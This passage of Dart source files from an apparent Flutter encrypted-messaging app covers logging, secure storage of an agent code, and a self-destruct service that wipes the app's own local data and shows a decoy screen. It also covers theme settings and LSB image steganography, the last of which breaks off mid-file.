      [dynamic error, StackTrace? stackTrace]) {
    // التحقق مما إذا كان يجب تسجيل هذا المستوى بناءً على currentLogLevel
    if (level.index >= currentLogLevel.index) {
      final eventTimestamp = DateTime.now();
      String fullMessageForEvent = '$tag: $message'; // رسالة لـ LogEvent

      if (error != null) {
        fullMessageForEvent += '\nError: $error';
        // يمكن إضافة stackTrace إلى رسالة الحدث إذا أردنا
        // if (stackTrace != null) {
        //   fullMessageForEvent += '\nStackTrace: $stackTrace';
        // }
      }

      // 1. إنشاء وإضافة LogEvent إلى StreamController
      final logEvent = LogEvent(
        message: fullMessageForEvent,
        level: level,
        timestamp: eventTimestamp,
        source: _className, // استخدام اسم الفئة كمصدر للحدث
      );
      _logController.add(logEvent);

      // 2. طباعة السجل إلى وحدة التحكم (المنطق الموجود من الشيفرة الأصلية)
      final timestampString = eventTimestamp.toIso8601String();
      // تم تعديل level.toString() ليتوافق مع التسمية بالأحرف الكبيرة
      String consoleLogMessage =
          '$timestampString [${level.toString().split('.').last}] [$_className] $tag: $message';
      if (error != null) {
        consoleLogMessage += '\nError: $error';
      }
      // فقط اطبع stackTrace للأخطاء أو إذا تم تمريره بشكل صريح للتحذير أو الحرج
      if (stackTrace != null &&
          (level == LogLevel.ERROR ||
              level == LogLevel.WARN ||
              level == LogLevel.CRITICAL)) {
        consoleLogMessage += '\nStackTrace: $stackTrace';
      }
      debugPrint(consoleLogMessage); // استخدام debugPrint
    }
  }

  // دوال التسجيل العامة
  void debug(String tag, String message) {
    _log(LogLevel.DEBUG, tag, message);
  }

  void info(String tag, String message) {
    _log(LogLevel.INFO, tag, message);
  }

  void warn(String tag, String message,
      {dynamic error, StackTrace? stackTrace}) {
    _log(LogLevel.WARN, tag, message, error, stackTrace);
  }

  void error(String tag, String message,
      [dynamic error, StackTrace? stackTrace]) {
    // في الشيفرة الأصلية LogLevel.error، تم توحيدها إلى LogLevel.ERROR
    _log(LogLevel.ERROR, tag, message, error, stackTrace);
  }

  void critical(String tag, String message,
      [dynamic error, StackTrace? stackTrace]) {
    _log(LogLevel.CRITICAL, tag, message, error, stackTrace);
  }

  // يمكن إضافة دالة success إذا كانت جزءًا من متطلبات التسجيل الشاملة
  void success(String tag, String message) {
    _log(LogLevel.SUCCESS, tag, message);
  }

  // مهم: يجب استدعاء dispose لإغلاق StreamController عند عدم الحاجة إليه
  void dispose() {
    _logController.close();
  }
}



// ------------------------------ نهاية الملف: logger_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: logger_service1.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\logging\logger_service1.dart
// ----------------------------------------------------------------------

// lib/core/logging/logger_service.dart
import "package:logger/logger.dart";

class LoggerService {
  final String className;
  late final Logger _logger;

  LoggerService(this.className) {
    _logger = Logger(
      printer: PrettyPrinter(
        methodCount: 1,
        errorMethodCount: 5,
        lineLength: 100,
        colors: true,
        printEmojis: true,
        printTime: true,
      ),
      // You can set the minimum log level here, e.g., Level.warning for production
      // level: Level.debug, 
    );
  }

  // Info log
  void i(dynamic message, [dynamic error, StackTrace? stackTrace]) {
    _logger.i("$className: $message", error: error, stackTrace: stackTrace);
  }

  // Debug log
  void d(dynamic message, [dynamic error, StackTrace? stackTrace]) {
    _logger.d("$className: $message", error: error, stackTrace: stackTrace);
  }

  // Warning log
  void w(dynamic message, [dynamic error, StackTrace? stackTrace]) {
    _logger.w("$className: $message", error: error, stackTrace: stackTrace);
  }

  // Error log
  void e(dynamic message, [dynamic error, StackTrace? stackTrace]) {
    _logger.e("$className: $message", error: error, stackTrace: stackTrace);
  }

  // Verbose log
  void v(dynamic message, [dynamic error, StackTrace? stackTrace]) {
    _logger.v("$className: $message", error: error, stackTrace: stackTrace);
  }

  // WTF (What a Terrible Failure) log
  void wtf(dynamic message, [dynamic error, StackTrace? stackTrace]) {
    _logger.f("$className: $message", error: error, stackTrace: stackTrace);
  }
}




// ------------------------------ نهاية الملف: logger_service1.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: secure_storage_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\security\secure_storage_service.dart
// ----------------------------------------------------------------------

// lib/core/security/secure_storage_service.dart
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

// Cambiar esta línea:
// const String agentCodeKey = 'current_agent_code_conduit';
// Por esta:
const String agentCodeKey = 'conduit_current_agent_code_v1';

class SecureStorageService {
  final FlutterSecureStorage _storage;

  SecureStorageService(this._storage);

  Future<void> writeAgentCode(String agentCode) async {
    await _storage.write(key: agentCodeKey, value: agentCode);
  }

  Future<String?> readAgentCode() async {
    return await _storage.read(key: agentCodeKey);
  }

  Future<void> deleteAgentCode() async {
    await _storage.delete(key: agentCodeKey);
  }

  Future<void> deleteAll() async {
    await _storage.deleteAll();
  }
}

final flutterSecureStorageProvider =
    Provider((ref) => const FlutterSecureStorage());

final secureStorageServiceProvider = Provider<SecureStorageService>((ref) {
  final storage = ref.watch(flutterSecureStorageProvider);
  return SecureStorageService(storage);
});



// ------------------------------ نهاية الملف: secure_storage_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: self_destruct_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\security\self_destruct_service.dart
// ----------------------------------------------------------------------

// lib/core/security/self_destruct_service.dart
import "dart:io";
import "dart:math";
import "dart:typed_data";

import "package:cloud_firestore/cloud_firestore.dart"
    as firestore; // Import with prefix for clarity
import "package:cloud_firestore/cloud_firestore.dart"
    hide FieldValue; // Hide Sembast's FieldValue
import "package:crypto/crypto.dart";
import "package:flutter/material.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:path_provider/path_provider.dart";
import "package:shared_preferences/shared_preferences.dart";

import "../../presentation/chat/providers/auth_providers.dart";
import "../../presentation/decoy_screen/decoy_screen.dart";
import "../history/history_service.dart";
import "../logging/logger_provider.dart";
import "../logging/logger_service.dart";
import "secure_storage_service.dart";

final selfDestructServiceProvider = Provider<SelfDestructService>((ref) {
  return SelfDestructService(ref);
});

class SelfDestructService {
  final Ref _ref;
  final FirebaseFirestore _firestoreInstance = FirebaseFirestore.instance;
  
  // عدد دورات الكتابة فوق الملفات للتأكد من المسح الآمن
  static const int _secureWipeIterations = 3;
  
  // قائمة بأنماط الكتابة المختلفة للمسح الآمن
  static final List<List<int> Function(int)> _wipePatterns = [
    // نمط الأصفار
    (int size) => List<int>.filled(size, 0),
    // نمط الواحدات
    (int size) => List<int>.filled(size, 255),
    // نمط عشوائي
    (int size) {
      final random = Random.secure();
      return List<int>.generate(size, (_) => random.nextInt(256));
    },
  ];

  SelfDestructService(this._ref);

  /// مسح آمن لقاعدة بيانات Sembast مع التحقق من اكتمال العملية
  Future<bool> _secureWipeSembastDatabase(LoggerService logger) async {
    try {
      final appDocDir = await getApplicationDocumentsDirectory();
      final dbPath = "${appDocDir.path}/the_conduit_app.db";
      final dbFile = File(dbPath);

      if (await dbFile.exists()) {
        logger.info("SelfDestructService",
            "Sembast DB found at $dbPath. Initiating secure wipe protocol.");
        
        final fileSize = await dbFile.length();
        if (fileSize == 0) {
          logger.warn("SelfDestructService", 
              "Sembast DB file exists but has zero size. Proceeding with deletion.");
          await dbFile.delete();
          return !await dbFile.exists();
        }
        
        // حساب قيمة التجزئة الأصلية للملف للتحقق لاحقاً
        final originalHash = await _calculateFileHash(dbFile);
        logger.info("SelfDestructService", 
            "Original file hash: $originalHash. Starting secure wipe process.");
        
        // تنفيذ عدة دورات من الكتابة فوق الملف بأنماط مختلفة
        for (int i = 0; i < _secureWipeIterations; i++) {
          final pattern = _wipePatterns[i % _wipePatterns.length];
          final wipeData = pattern(fileSize);
          
          final sink = dbFile.openWrite(mode: FileMode.writeOnly);
          sink.add(wipeData);
          await sink.flush();
          await sink.close();
          
          // التحقق من أن البيانات تم كتابتها بالفعل
          final newHash = await _calculateFileHash(dbFile);
          if (newHash == originalHash) {
            logger.error("SelfDestructService", 
                "Wipe iteration $i failed: File content unchanged. Attempting alternative method.");
            
            // محاولة بديلة باستخدام طريقة مختلفة للكتابة
            await dbFile.writeAsBytes(wipeData, flush: true);
            final retryHash = await _calculateFileHash(dbFile);
            
            if (retryHash == originalHash) {
              logger.error("SelfDestructService", 
                  "Alternative wipe method also failed. File system may be preventing overwrites.");
            } else {
              logger.info("SelfDestructService", 
                  "Alternative wipe method successful for iteration $i.");
            }
          } else {
            logger.info("SelfDestructService", 
                "Wipe iteration $i successful. New hash: $newHash");
          }
          
          // تأخير قصير بين العمليات لتجنب إرهاق النظام
          await Future.delayed(const Duration(milliseconds: 50));
        }
        
        // حذف الملف بعد الكتابة فوقه
        await dbFile.delete();
        
        // التحقق من أن الملف تم حذفه بالفعل
        final fileExists = await dbFile.exists();
        if (fileExists) {
          logger.error("SelfDestructService", 
              "Failed to delete Sembast DB file after secure wipe. File still exists.");
          return false;
        } else {
          logger.info("SelfDestructService", 
              "Sembast DB file successfully wiped and deleted: $dbPath");
          return true;
        }
      } else {
        logger.info("SelfDestructService",
            "Sembast DB file not found at $dbPath. No wipe needed.");
        return true;
      }
    } catch (e, s) {
      logger.error(
          "SelfDestructService", "Error during Sembast DB secure wipe", e, s);
      return false;
    }
  }

  /// حساب قيمة تجزئة SHA-256 للملف
  Future<String> _calculateFileHash(File file) async {
    try {
      final bytes = await file.readAsBytes();
      final digest = sha256.convert(bytes);
      return digest.toString();
    } catch (e) {
      return "hash_calculation_failed";
    }
  }

  /// مسح SharedPreferences مع التحقق من اكتمال العملية
  Future<bool> _clearSharedPreferences(LoggerService logger) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      
      // حفظ عدد المفاتيح قبل المسح للتحقق لاحقاً
      final keysBeforeClear = prefs.getKeys();
      final keyCountBeforeClear = keysBeforeClear.length;
      
      if (keyCountBeforeClear == 0) {
        logger.info("SelfDestructService", "SharedPreferences already empty. No clearing needed.");
        return true;
      }
      
      logger.info("SelfDestructService", 
          "Clearing SharedPreferences. Keys before clear: $keyCountBeforeClear");
      
      // مسح البيانات
      final clearResult = await prefs.clear();
      
      if (!clearResult) {
        logger.error("SelfDestructService", 
            "SharedPreferences.clear() returned false. Attempting individual key removal.");
        
        // محاولة حذف كل مفتاح على حدة إذا فشلت عملية المسح الكاملة
        bool allRemoved = true;
        for (final key in keysBeforeClear) {
          final removed = await prefs.remove(key);
          if (!removed) {
            logger.error("SelfDestructService", "Failed to remove key: $key");
            allRemoved = false;
          }
        }
        
        if (!allRemoved) {
          logger.error("SelfDestructService", 
              "Some SharedPreferences keys could not be removed.");
          return false;
        }
      }
      
      // التحقق من أن جميع المفاتيح تم حذفها
      final keysAfterClear = prefs.getKeys();
      final keyCountAfterClear = keysAfterClear.length;
      
      if (keyCountAfterClear > 0) {
        logger.error("SelfDestructService", 
            "SharedPreferences not fully cleared. Keys remaining: $keyCountAfterClear");
        return false;
      }
      
      logger.info("SelfDestructService", "SharedPreferences successfully cleared and verified.");
      return true;
    } catch (e, s) {
      logger.error(
          "SelfDestructService", "Error clearing SharedPreferences", e, s);
      return false;
    }
  }

  /// مسح مجلدات التخزين المؤقت ومجلدات الدعم مع التحقق من اكتمال العملية
  Future<bool> _clearAppCacheAndSupportDirs(LoggerService logger) async {
    bool allSuccess = true;
    
    try {
      // مسح مجلد التخزين المؤقت
      final cacheDir = await getTemporaryDirectory();
      if (await cacheDir.exists()) {
        logger.info("SelfDestructService",
            "Clearing cache directory: ${cacheDir.path}");
        
        // مسح محتويات المجلد أولاً قبل حذف المجلد نفسه
        await _secureWipeDirectory(cacheDir, logger);
        
        // حذف المجلد بشكل متكرر
        await cacheDir.delete(recursive: true);
        
        // التحقق من أن المجلد تم حذفه
        if (await cacheDir.exists()) {
          logger.error("SelfDestructService", 
              "Failed to delete cache directory after wiping: ${cacheDir.path}");
          allSuccess = false;
        } else {
          logger.info("SelfDestructService", 
              "Cache directory successfully wiped and deleted: ${cacheDir.path}");
        }
      }

      // مسح مجلد دعم التطبيق
      final appSupportDir = await getApplicationSupportDirectory();
      if (await appSupportDir.exists()) {
        logger.info("SelfDestructService",
            "Clearing application support directory: ${appSupportDir.path}");
        
        // مسح محتويات المجلد أولاً قبل حذف المجلد نفسه
        await _secureWipeDirectory(appSupportDir, logger);
        
        // حذف المجلد بشكل متكرر
        await appSupportDir.delete(recursive: true);
        
        // التحقق من أن المجلد تم حذفه
        if (await appSupportDir.exists()) {
          logger.error("SelfDestructService", 
              "Failed to delete app support directory after wiping: ${appSupportDir.path}");
          allSuccess = false;
        } else {
          logger.info("SelfDestructService", 
              "App support directory successfully wiped and deleted: ${appSupportDir.path}");
        }
      }
      
      return allSuccess;
    } catch (e, s) {
      logger.error("SelfDestructService",
          "Error clearing app cache/support directories", e, s);
      return false;
    }
  }

  /// مسح آمن لمحتويات مجلد بالكامل
  Future<void> _secureWipeDirectory(Directory directory, LoggerService logger) async {
    try {
      // الحصول على قائمة بجميع الملفات في المجلد وجميع المجلدات الفرعية
      final entities = await directory.list(recursive: true).toList();
      
      // مسح الملفات أولاً
      for (final entity in entities) {
        if (entity is File) {
          try {
            final fileSize = await entity.length();
            if (fileSize > 0) {
              // استخدام نمط عشوائي للكتابة فوق الملف
              final random = Random.secure();
              final wipeData = Uint8List(fileSize);
              for (int i = 0; i < fileSize; i++) {
                wipeData[i] = random.nextInt(256);
              }
              
              await entity.writeAsBytes(wipeData, flush: true);
            }
            await entity.delete();
          } catch (e) {
            logger.warn("SelfDestructService", 
                "Error wiping file ${entity.path}: $e. Continuing with next file.");
          }
        }
      }
      
      // حذف المجلدات الفرعية من الأعمق إلى الأعلى
      final directories = entities
          .whereType<Directory>()
          .toList()
          ..sort((a, b) => b.path.length.compareTo(a.path.length)); // ترتيب تنازلي حسب طول المسار
      
      for (final subDir in directories) {
        try {
          await subDir.delete();
        } catch (e) {
          logger.warn("SelfDestructService", 
              "Error deleting subdirectory ${subDir.path}: $e. Continuing with next directory.");
        }
      }
    } catch (e, s) {
      logger.error("SelfDestructService", 
          "Error during secure directory wipe", e, s);
    }
  }

  /// تنفيذ التدمير الذاتي مع التحقق من اكتمال العملية
  Future<bool> initiateSelfDestruct(BuildContext context,
      {String? triggeredBy, bool performLogout = true, bool silent = false}) async {
    final logger = _ref.read(appLoggerProvider);
    final secureStorageService = _ref.read(secureStorageServiceProvider);
    final currentAgentCode = await secureStorageService.readAgentCode();
    
    // إنشاء معرف فريد للعملية للتتبع في السجلات
    final operationId = DateTime.now().millisecondsSinceEpoch.toString();

    logger.error(
        "FULL SELF-DESTRUCT SEQUENCE INITIATED [ID:$operationId] by: ${triggeredBy ?? 'Unknown'}. Agent: $currentAgentCode. Perform Logout: $performLogout. Silent: $silent",
        "SELF_DESTRUCT_SERVICE");

    // التقاط BuildContext والحالة المثبتة قبل الفجوات غير المتزامنة
    final scaffoldMessenger = ScaffoldMessenger.of(context);
    final navigator = Navigator.of(context);
    bool isContextMounted() => context.mounted;

    // إظهار إشعار بدء العملية إذا لم تكن صامتة
    if (!silent && isContextMounted()) {
      scaffoldMessenger.showSnackBar(
        SnackBar(
          content: Text('بدء تسلسل التدمير الذاتي الكامل للبيانات المحلية...',
              style: GoogleFonts.cairo(color: Colors.white)),
          backgroundColor: Colors.red.shade900,
          duration: const Duration(seconds: 3),
        ),
      );
    }
    await Future.delayed(const Duration(milliseconds: 500));

    // قائمة لتتبع نجاح كل خطوة
    final Map<String, bool> operationResults = {};

    try {
      // 1. مسح البيانات على الخادم
      if (currentAgentCode != null && currentAgentCode.isNotEmpty) {
        logger.info("SelfDestructService [ID:$operationId]",
            "Marking server-side conversations as deleted for agent: $currentAgentCode");
        
        try {
          final conversationsSnapshot = await _firestoreInstance
              .collection('conversations')
              .where('participants', arrayContains: currentAgentCode)
              .get();

          logger.info("SelfDestructService [ID:$operationId]",
              "Found ${conversationsSnapshot.docs.length} conversations to mark as deleted for agent $currentAgentCode.");
          
          if (conversationsSnapshot.docs.isNotEmpty) {
            WriteBatch batch = _firestoreInstance.batch();
            for (final convDoc in conversationsSnapshot.docs) {
              batch.update(convDoc.reference, {
                'deletedForUsers.$currentAgentCode': true,
                'updatedAt': firestore.FieldValue.serverTimestamp()
              });
            }
            await batch.commit();
            operationResults['server_data_marking'] = true;
            logger.info("SelfDestructService [ID:$operationId]",
                "Successfully marked ${conversationsSnapshot.docs.length} conversations as deleted for agent $currentAgentCode.");
          } else {
            operationResults['server_data_marking'] = true;
            logger.info("SelfDestructService [ID:$operationId]",
                "No conversations found to mark as deleted for agent $currentAgentCode.");
          }
        } catch (e, s) {
          operationResults['server_data_marking'] = false;
          logger.error("SelfDestructService [ID:$operationId]",
              "Error marking server-side conversations as deleted", e, s);
        }
      } else {
        operationResults['server_data_marking'] = true;
        logger.warn("SelfDestructService [ID:$operationId]",
            "No agent code found. Skipping server-side data marking.");
      }

      // 2. مسح السجل المحلي
      try {
        final historyService = _ref.read(historyServiceProvider);
        await historyService.clearHistory();
        operationResults['history_clearing'] = true;
        logger.info("SelfDestructService [ID:$operationId]", "Cleared local history.");
      } catch (e, s) {
        operationResults['history_clearing'] = false;
        logger.error("SelfDestructService [ID:$operationId]", 
            "Error clearing local history", e, s);
      }

      // 3. مسح قاعدة بيانات Sembast بشكل آمن
      operationResults['sembast_wipe'] = await _secureWipeSembastDatabase(logger);

      // 4. مسح التخزين الآمن
      try {
        await secureStorageService.deleteAll();
        operationResults['secure_storage_clearing'] = true;
        logger.info("SelfDestructService [ID:$operationId]", "Cleared FlutterSecureStorage.");
      } catch (e, s) {
        operationResults['secure_storage_clearing'] = false;
        logger.error("SelfDestructService [ID:$operationId]", 
            "Error clearing FlutterSecureStorage", e, s);
      }

      // 5. مسح SharedPreferences
      operationResults['shared_prefs_clearing'] = await _clearSharedPreferences(logger);

      // 6. مسح مجلدات التخزين المؤقت ومجلدات الدعم
      operationResults['cache_dirs_clearing'] = await _clearAppCacheAndSupportDirs(logger);

      // 7. تسجيل الخروج إذا كان مطلوباً
      if (performLogout) {
        try {
          final authService = _ref.read(authServiceProvider);
          await authService.signOut();
          operationResults['logout'] = true;
          logger.info("SelfDestructService [ID:$operationId]", "User logged out successfully.");
        } catch (e, s) {
          operationResults['logout'] = false;
          logger.error("SelfDestructService [ID:$operationId]", 
              "Error during logout", e, s);
        }
      } else {
        operationResults['logout'] = true;
        logger.info("SelfDestructService [ID:$operationId]", "Logout skipped as requested.");
      }

      // التحقق من نجاح جميع العمليات
      final bool allOperationsSuccessful = !operationResults.values.contains(false);
      
      // تسجيل نتيجة العملية الكاملة
      if (allOperationsSuccessful) {
        logger.info("SelfDestructService [ID:$operationId]",
            "SELF-DESTRUCT COMPLETED SUCCESSFULLY. All operations succeeded: $operationResults");
        
        // إظهار إشعار نجاح العملية إذا لم تكن صامتة
        if (!silent && isContextMounted()) {
          scaffoldMessenger.showSnackBar(
            SnackBar(
              content: Text('تم مسح جميع البيانات المحلية بنجاح.',
                  style: GoogleFonts.cairo(color: Colors.white)),
              backgroundColor: Colors.green.shade800,
              duration: const Duration(seconds: 3),
            ),
          );
        }
        
        // الانتقال إلى شاشة ما بعد التدمير
        if (isContextMounted()) {
          navigator.pushAndRemoveUntil(
            MaterialPageRoute(
                builder: (_) => const DecoyScreen(isPostDestruct: true)),
            (route) => false,
          );
        }
        
        return true;
      } else {
        logger.error("SelfDestructService [ID:$operationId]",
            "SELF-DESTRUCT PARTIALLY FAILED. Operation results: $operationResults");
        
        // إظهار إشعار فشل العملية إذا لم تكن صامتة
        if (!silent && isContextMounted()) {
          scaffoldMessenger.showSnackBar(
            SnackBar(
              content: Text('فشل في مسح بعض البيانات المحلية. جاري محاولة التنظيف النهائي...',
                  style: GoogleFonts.cairo(color: Colors.white)),
              backgroundColor: Colors.orange.shade900,
              duration: const Duration(seconds: 3),
            ),
          );
        }
        
        // محاولة تنظيف نهائية للبيانات الحساسة
        try {
          logger.info("SelfDestructService [ID:$operationId]",
              "Attempting final cleanup for critical data...");
          
          final authService = _ref.read(authServiceProvider);
          await authService.signOut();
          await _ref.read(secureStorageServiceProvider).deleteAll();
          await _clearSharedPreferences(logger);
          _ref.invalidate(currentAgentCodeProvider);
          
          if (isContextMounted()) {
            navigator.pushAndRemoveUntil(
              MaterialPageRoute(
                  builder: (_) => const DecoyScreen(isPostDestruct: true)),
              (route) => false,
            );
          }
        } catch (finalError, finalStackTrace) {
          logger.error("SelfDestructService [ID:$operationId]", 
              "Error during fallback cleanup", finalError, finalStackTrace);
        }
      }
      
      return false;
    } catch (e, s) {
      logger.error("SelfDestructService [ID:$operationId]",
          "CRITICAL ERROR during self-destruct sequence", e, s);
      
      // إظهار إشعار فشل العملية إذا لم تكن صامتة
      if (!silent && isContextMounted()) {
        scaffoldMessenger.showSnackBar(
          SnackBar(
            content: Text('حدث خطأ أثناء مسح البيانات. جاري محاولة التنظيف النهائي...',
                style: GoogleFonts.cairo(color: Colors.white)),
            backgroundColor: Colors.red.shade900,
            duration: const Duration(seconds: 3),
          ),
        );
      }
      
      // محاولة تنظيف نهائية للبيانات الحساسة
      try {
        logger.info("SelfDestructService [ID:$operationId]",
            "Attempting emergency cleanup after critical error...");
        
        final authService = _ref.read(authServiceProvider);
        await authService.signOut();
        await _ref.read(secureStorageServiceProvider).deleteAll();
        await _clearSharedPreferences(logger);
        _ref.invalidate(currentAgentCodeProvider);
        
        if (isContextMounted()) {
          navigator.pushAndRemoveUntil(
            MaterialPageRoute(
                builder: (_) => const DecoyScreen(isPostDestruct: true)),
            (route) => false,
          );
        }
      } catch (finalError, finalStackTrace) {
        logger.error("SelfDestructService [ID:$operationId]", 
            "Error during emergency cleanup", finalError, finalStackTrace);
      }
      
      return false;
    }
  }

  /// تنفيذ التدمير الذاتي بشكل صامت دون إظهار أي إشعارات
  Future<bool> initiateSilentSelfDestruct(BuildContext context,
      {String? triggeredBy, bool performLogout = false}) async {
    return initiateSelfDestruct(
      context,
      triggeredBy: triggeredBy,
      performLogout: performLogout,
      silent: true,
    );
  }
  
  /// طريقة مختصرة للتدمير الذاتي الصامت - تستخدم من قبل DecoyScreenController
  Future<bool> silentSelfDestruct({String? triggeredBy}) async {
    final logger = _ref.read(appLoggerProvider);
    logger.info("SelfDestructService", "Silent self-destruct triggered without context by: ${triggeredBy ?? 'Unknown'}");
    
    try {
      // تنفيذ عمليات التدمير الذاتي بدون سياق واجهة المستخدم
      final secureStorageService = _ref.read(secureStorageServiceProvider);
      final currentAgentCode = await secureStorageService.readAgentCode();
      
      // 1. مسح البيانات على الخادم
      if (currentAgentCode != null && currentAgentCode.isNotEmpty) {
        try {
          final conversationsSnapshot = await _firestoreInstance
              .collection('conversations')
              .where('participants', arrayContains: currentAgentCode)
              .get();
          
          if (conversationsSnapshot.docs.isNotEmpty) {
            WriteBatch batch = _firestoreInstance.batch();
            for (final convDoc in conversationsSnapshot.docs) {
              batch.update(convDoc.reference, {
                'deletedForUsers.$currentAgentCode': true,
                'updatedAt': firestore.FieldValue.serverTimestamp()
              });
            }
            await batch.commit();
          }
        } catch (e, s) {
          logger.error("SelfDestructService", "Error marking server-side conversations as deleted", e, s);
        }
      }
      
      // 2. مسح السجل المحلي
      try {
        final historyService = _ref.read(historyServiceProvider);
        await historyService.clearHistory();
      } catch (e, s) {
        logger.error("SelfDestructService", "Error clearing local history", e, s);
      }
      
      // 3. مسح التخزين الآمن
      try {
        await secureStorageService.deleteAll();
      } catch (e, s) {
        logger.error("SelfDestructService", "Error clearing secure storage", e, s);
      }
      
      // 4. مسح SharedPreferences
      await _clearSharedPreferences(logger);
      
      // 5. مسح قاعدة بيانات Sembast
      await _secureWipeSembastDatabase(logger);
      
      // 6. مسح مجلدات التخزين المؤقت
      await _clearAppCacheAndSupportDirs(logger);
      
      logger.info("SelfDestructService", "Silent self-destruct completed");
      return true;
    } catch (e, s) {
      logger.error("SelfDestructService", "Error during silent self-destruct", e, s);
      return false;
    }
  }
}



// ------------------------------ نهاية الملف: self_destruct_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: theme_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\settings\theme_service.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

class ThemeService {
  static const String _themeModeKey = 'theme_mode_v2';
  static const String _primaryColorKey = 'primary_color_v2';
  static const String _useMaterial3Key = 'use_material3_v2';

  // Define the intelligence-style primary color (same as in app.dart)
  static const Color intelligencePrimaryColor = Color(0xFF004D40);

  // Load ThemeMode from SharedPreferences
  Future<ThemeMode> loadThemeMode() async {
    final prefs = await SharedPreferences.getInstance();
    final themeIndex = prefs.getInt(_themeModeKey) ?? ThemeMode.system.index;
    // Ensure the index is valid before returning
    if (themeIndex >= 0 && themeIndex < ThemeMode.values.length) {
      return ThemeMode.values[themeIndex];
    }
    return ThemeMode.system; // Default fallback
  }

  // Save ThemeMode to SharedPreferences
  Future<void> saveThemeMode(ThemeMode mode) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setInt(_themeModeKey, mode.index);
  }

  // Load Primary Color value (int) from SharedPreferences
  Future<int?> loadPrimaryColorValue() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getInt(_primaryColorKey);
  }

  // Load Primary Color from SharedPreferences, defaulting to intelligence color
  Future<Color> loadPrimaryColor() async {
    final colorValue = await loadPrimaryColorValue();
    // Use the intelligence color as the default if no color is saved
    return Color(colorValue ?? intelligencePrimaryColor.value);
  }

  // Save Primary Color to SharedPreferences
  Future<void> savePrimaryColor(Color color) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setInt(_primaryColorKey, color.value);
  }

  // Load Material 3 preference from SharedPreferences
  Future<bool> loadUseMaterial3() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool(_useMaterial3Key) ?? true; // Default to true
  }

  // Save Material 3 preference to SharedPreferences
  Future<void> saveUseMaterial3(bool useMaterial3) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool(_useMaterial3Key, useMaterial3);
  }
}




// ------------------------------ نهاية الملف: theme_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: image_steganography_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\steganography\image_steganography_service.dart
// ----------------------------------------------------------------------

import 'dart:typed_data';
import 'package:image/image.dart' as img;

class ImageSteganographyService {
  // Embeds data into the least significant bits (LSB) of an image's RGB channels.
  // Prepends the data with a 4-byte (big-endian) length prefix.
  // Returns the modified image bytes encoded in PNG format (lossless).
  Future<Uint8List> embedBytesInImage(Uint8List imageBytes, Uint8List dataToEmbed) async {
    // Decode the input image bytes. Supports various formats like PNG, JPG, etc.
    img.Image? image = img.decodeImage(imageBytes);
    if (image == null) {
      throw Exception('فشل في فك تشفير الصورة. قد يكون التنسيق غير مدعوم.');
    }

    // 1. Prepare data with length prefix
    int dataLength = dataToEmbed.length;
    // Create a new list: 4 bytes for length + original data bytes
    Uint8List dataWithLength = Uint8List(dataLength + 4);
    // Write the length as a 32-bit unsigned integer (big-endian) at the beginning
    ByteData.view(dataWithLength.buffer).setUint32(0, dataLength, Endian.big);
    // Copy the actual data after the length prefix
    dataWithLength.setRange(4, dataLength + 4, dataToEmbed);

    // 2. Check if the image is large enough
    int requiredBits = dataWithLength.length * 8; // Total bits to embed
    // Calculate available bits using LSB of R, G, B channels (3 bits per pixel)
    int availableBits = image.width * image.height * 3;

    if (requiredBits > availableBits) {
      throw Exception('الصورة صغيرة جدًا لإخفاء هذه الكمية من البيانات.');
    }

    // 3. Embed data bit by bit into LSBs
    int dataIndex = 0; // Current byte index in dataWithLength
    int bitIndex = 0; // Current bit index (0-7) within the current byte

    // Iterate through pixels (rows first, then columns)
    for (int y = 0; y < image.height; y++) {
      for (int x = 0; x < image.width; x++) {
        // Stop if all data has been embedded
        if (dataIndex >= dataWithLength.length) break;

        img.Pixel pixel = image.getPixel(x, y);
        int r = pixel.r.toInt();
        int g = pixel.g.toInt();
        int b = pixel.b.toInt();

        // Embed one bit into the LSB of the Red channel
        if (dataIndex < dataWithLength.length) {
          // Get the current bit from the data byte
          int bit = (dataWithLength[dataIndex] >> (7 - bitIndex)) & 1;
          // Clear the LSB of the color channel and set it to the data bit
          r = (r & 0xFE) | bit;
          // Move to the next bit
          bitIndex++;
          if (bitIndex == 8) { // If all 8 bits of the byte are processed
            bitIndex = 0; // Reset bit index
            dataIndex++; // Move to the next data byte
          }
        }

        // Embed one bit into the LSB of the Green channel
        if (dataIndex < dataWithLength.length) {
          int bit = (dataWithLength[dataIndex] >> (7 - bitIndex)) & 1;
          g = (g & 0xFE) | bit;
          bitIndex++;
          if (bitIndex == 8) {
            bitIndex = 0;
            dataIndex++;
          }
        }

        // Embed one bit into the LSB of the Blue channel
        if (dataIndex < dataWithLength.length) {
          int bit = (dataWithLength[dataIndex] >> (7 - bitIndex)) & 1;
          b = (b & 0xFE) | bit;
          bitIndex++;
          if (bitIndex == 8) {
            bitIndex = 0;
            dataIndex++;
          }
        }

        // Update the pixel in the image with modified RGB values (Alpha remains unchanged)
        image.setPixelRgb(x, y, r, g, b);
      }
      // Stop outer loop if all data embedded
      if (dataIndex >= dataWithLength.length) break;
    }

    // 4. Encode the modified image back to PNG bytes
    // PNG is used because it's a lossless format, preserving the LSB changes.
    return Uint8List.fromList(img.encodePng(image));
  }

  // Extracts data hidden in the least significant bits (LSB) of an image's RGB channels.
  // Assumes data was embedded using embedBytesInImage (with 4-byte length prefix).
